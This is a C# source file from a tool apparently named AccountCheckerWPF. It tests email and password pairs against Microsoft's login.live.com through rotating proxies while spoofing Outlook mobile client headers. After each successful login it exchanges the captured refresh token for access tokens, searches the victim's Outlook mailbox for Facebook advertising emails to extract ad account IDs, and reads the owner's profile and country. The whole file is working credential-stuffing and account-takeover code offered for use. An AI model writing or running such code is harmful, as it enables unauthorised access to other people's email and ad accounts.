using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using AccountCheckerWPF.Helper;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;
using AccountCheckerWPF.Services.Interface;
using Newtonsoft.Json.Linq;

namespace AccountCheckerWPF.Services;

public class HttpServices : IHttpServices
{
    private HttpClient _httpClient;
    private Proxy _proxy;
    private readonly ProxyManager _proxyManager;

    public HttpServices(ProxyManager proxyManager)
    {
        _proxyManager = proxyManager;
    }

    public void InitHttpClient()
    {
        try
        {
            var httpClientHandler = _proxyManager.GetRandomProxyTransport(out _proxy);

            _httpClient = new HttpClient(httpClientHandler)
            {
                Timeout = TimeSpan.FromSeconds(10)
            };
        }
        catch (Exception e)
        {
            _proxy.InUse = false;

            throw;
        }
    }

    public async Task<HttpResponseMessage> SendGetParamsFromLoginPageRequestAsync()
    {
        try
        {
            var getRequest = new HttpRequestMessage(HttpMethod.Get, "https://login.live.com/");
            getRequest.Headers.Add("User-Agent",
                "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
            getRequest.Headers.Add("Accept", "*/*");
            getRequest.Headers.Add("Accept-Language", "en-US,en;q=0.8");

            return await _httpClient.SendAsync(getRequest);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }

    public async Task<HttpResponseMessage> SendPostLoginRequestAsync(string email, string password, string ppft,
        string contextid, string bk, string uaid)
    {
        try
        {
            var contentPost =
                $"i13=1&login={WebUtility.UrlEncode(email)}&loginfmt={WebUtility.UrlEncode(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={WebUtility.UrlEncode(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=41679";
            var contentBytes = new StringContent(contentPost, Encoding.UTF8, "application/x-www-form-urlencoded");

            var postRequest = new HttpRequestMessage(HttpMethod.Post,
                $"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={WebUtility.UrlEncode(email)}&contextid={contextid}&bk={bk}&uaid={uaid}&pid=15216")
            {
                Content = contentBytes
            };

            postRequest.Headers.Host = "login.live.com";
            postRequest.Headers.Connection.ParseAdd("keep-alive");
            postRequest.Headers.CacheControl = new CacheControlHeaderValue
            {
                MaxAge = TimeSpan.Zero
            };
            postRequest.Headers.Add("Origin", "https://login.live.com");
            postRequest.Headers.Add("User-Agent",
                "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
            postRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
            postRequest.Headers.Referrer = new Uri("https://login.live.com");
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xhtml+xml"));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xml", 0.9));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/avif", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/webp", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/apng", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("*/*", 0.8));
            postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/signed-exchange", 0.9));
            postRequest.Headers.Add("X-Requested-With", "com.microsoft.office.outlook");
            postRequest.Headers.Add("Sec-Fetch-Site", "same-origin");
            postRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
            postRequest.Headers.Add("Sec-Fetch-User", "?1");
            postRequest.Headers.Add("Sec-Fetch-Dest", "document");
            postRequest.Headers.AcceptEncoding.ParseAdd("gzip");
            postRequest.Headers.AcceptEncoding.ParseAdd("deflate");
            postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-US"));
            postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en", 0.9));

            return await _httpClient.SendAsync(postRequest);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }


    public async Task<HttpResponseMessage> SendPostRequestToGetAccessTokenAsync(string refreshToken)
    {
        try
        {
            var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://login.live.com/oauth20_token.srf");
            requestMessage.Headers.TryAddWithoutValidation("x-ms-sso-Ignore-SSO", "1");
            requestMessage.Headers.TryAddWithoutValidation("User-Agent", "Outlook-Android/2.0");
            requestMessage.Headers.TryAddWithoutValidation("Content-Type", "application/x-www-form-urlencoded");
            requestMessage.Headers.TryAddWithoutValidation("Host", "login.live.com");
            requestMessage.Headers.TryAddWithoutValidation("Connection", "Keep-Alive");
            requestMessage.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip");

            var content = new StringContent(
                $"grant_type=refresh_token&client_id=0000000048170EF2&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&refresh_token={refreshToken}&uaid=db28da170f2a4b85a26388d0a6cdbb6e",
                Encoding.UTF8,
                "application/x-www-form-urlencoded");

            requestMessage.Content = content;

            return await _httpClient.SendAsync(requestMessage);
        }
        catch (Exception e)
        {
            _proxy.InUse = false;
            throw;
        }
    }

    public async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
    {
        var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();

        var address = postResponse.RequestMessage.RequestUri.ToString();
        var refreshToken = CommonHelper.ExtractValueBetween(address, "refresh_token=", "&");

        if (refreshToken != null)
        {
            var getAccessTokenResponse = await SendPostRequestToGetAccessTokenAsync(refreshToken);
            var getAccessTokenResponseBody = await getAccessTokenResponse.Content.ReadAsStringAsync();
            var json = JObject.Parse(getAccessTokenResponseBody);
            var accessToken = json["access_token"];

            await ProcessEmailData(accessToken.ToString(), cid);
            var jwtToken = await GetJwtTokenAsync(refreshToken, cid);
            var userProfileJson = await GetUserProfileInfoAsync(jwtToken, cid);
            var countryCode = ParseCountryCode(userProfileJson);
        }
    }

    public async Task ProcessEmailData(string accessToken, string cid)
    {
        var url =
            "https://outlook.office.com/api/beta/me/MailFolders/AllItems/messages?$select=Sender,Subject,From,CcRecipients,HasAttachments,Id,SentDateTime,ToRecipients,BccRecipients&$top=1000&$search=\"from:advertise-noreply@support.facebook.com\"";

        // Set up headers
        _httpClient.DefaultRequestHeaders.Add("User-Agent", "Outlook-Android/2.0");
        _httpClient.DefaultRequestHeaders.Add("Pragma", "no-cache");
        _httpClient.DefaultRequestHeaders.Add("Accept", "application/json");
        _httpClient.DefaultRequestHeaders.Add("ForceSync", "false");
        _httpClient.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", accessToken);
        _httpClient.DefaultRequestHeaders.Add("X-AnchorMailbox", $"CID:{cid}");
        _httpClient.DefaultRequestHeaders.Host = "substrate.office.com";
        _httpClient.DefaultRequestHeaders.ConnectionClose = false;

        try
        {
            var response = await _httpClient.GetAsync(url);
            response.EnsureSuccessStatusCode();
            var responseBody = await response.Content.ReadAsStringAsync();

            var jsonResponse = JObject.Parse(responseBody);

            var subjects = jsonResponse["value"]
                .Select(mail => mail["Subject"].ToString())
                .ToList();

            foreach (var subject in subjects)
            {
                var adsTitle = System.Web.HttpUtility.HtmlDecode(subject);
                int adsCount = CountOccurrences(adsTitle, "(");

                Console.WriteLine($"Found {adsCount} ads in subject: {adsTitle}");

                var idMatches = System.Text.RegularExpressions.Regex.Matches(adsTitle, @"\(([^)]*)\)")
                    .Select(m => m.Groups[1].Value)
                    .Distinct()
                    .ToList();

                foreach (var id in idMatches)
                {
                    Console.WriteLine($"Extracted ID: {id}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while fetching or processing email data: {ex.Message}");
        }
    }

    private int CountOccurrences(string source, string word)
    {
        return (source.Length - source.Replace(word, "").Length) / word.Length;
    }

    private async Task<string> GetJwtTokenAsync(string refreshToken, string cid)
    {
        var url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token";


        // Set up headers
        _httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
        _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
        _httpClient.DefaultRequestHeaders.Add("Accept-Language", "vi");
        _httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
        _httpClient.DefaultRequestHeaders.Add("Origin", "https://account.microsoft.com");
        _httpClient.DefaultRequestHeaders.Add("Referer", "https://account.microsoft.com/");
        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
        _httpClient.DefaultRequestHeaders.Add("Sec-Fetch-Site", "cross-site");
        _httpClient.DefaultRequestHeaders.Add("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0");
        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua",
            "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Opera GX\";v=\"102\"");
        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
        _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-platform", "\"Windows\"");

        // Prepare the POST data
        var postData = new List<KeyValuePair<string, string>>
        {
            new("client_id", "0000000048170EF2"),
            new("scope", "https://graph.microsoft.com/.default"),
            new("grant_type", "refresh_token"),
            new("client_info", "1"),
            new("x-client-SKU", "msal.js.browser"),
            new("x-client-VER", "2.37.0"),
            new("x-ms-lib-capability", "retry-after, h429"),
            new("x-client-current-telemetry", "5|61,0,,,|@azure/msal-react,1.5.4"),
            new("x-client-last-telemetry", "5|0|||0,0"),
            new("client-request-id", "fb6d9979-05a0-4351-9da7-a1a983529796"),
            new("refresh_token", refreshToken),
            new("X-AnchorMailbox", cid)
        };

        var content = new FormUrlEncodedContent(postData);

        try
        {
            // Send the POST request
            var response = await _httpClient.PostAsync(url, content);
            response.EnsureSuccessStatusCode();
            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the JWT from the response
            JObject jsonResponse = JObject.Parse(responseBody);
            var jwtToken = jsonResponse["access_token"].ToString();

            return jwtToken;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while obtaining JWT token: {ex.Message}");
            return null;
        }
    }

    private async Task<string> GetUserProfileInfoAsync(string jwtToken, string cid)
    {
        var url = "https://graph.microsoft.com/beta/me/profile";

        using (var httpClient = new HttpClient())
        {
            // Set up headers
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Outlook-Android/2.0");
            httpClient.DefaultRequestHeaders.Add("Pragma", "no-cache");
            httpClient.DefaultRequestHeaders.Add("Accept", "application/json");
            httpClient.DefaultRequestHeaders.Add("ForceSync", "false");
            httpClient.DefaultRequestHeaders.Authorization =
                new AuthenticationHeaderValue("Bearer", jwtToken);
            httpClient.DefaultRequestHeaders.Add("X-AnchorMailbox", $"CID:{cid}");
            httpClient.DefaultRequestHeaders.Host = "substrate.office.com";
            httpClient.DefaultRequestHeaders.ConnectionClose = false;

            try
            {
                // Send the GET request
                var response = await httpClient.GetAsync(url);
                response.EnsureSuccessStatusCode();
                var responseBody = await response.Content.ReadAsStringAsync();

                return responseBody;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while fetching user profile info: {ex.Message}");
                return null;
            }
        }
    }

    private string ParseCountryCode(string userProfileJson)
    {
        try
        {
            var jsonResponse = JObject.Parse(userProfileJson);
            var countryCode = jsonResponse["countryCode"]?.ToString();
            return countryCode;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while parsing country code: {ex.Message}");
            return null;
        }
    }
}